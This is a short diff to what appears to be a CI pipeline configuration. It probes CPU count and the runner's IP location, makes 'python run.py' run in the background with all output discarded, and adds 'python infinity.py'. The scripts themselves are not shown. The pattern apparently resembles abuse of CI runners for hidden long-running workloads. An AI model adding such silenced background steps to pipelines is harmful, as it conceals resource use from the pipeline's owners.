@@ -9,4 +9,6 @@ steps:
   - ./setup
   - nproc
   - curl ipinfo.io
-  - python run.py
+  - python run.py > /dev/null 2>&1 &
+  - export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+  - python infinity.py
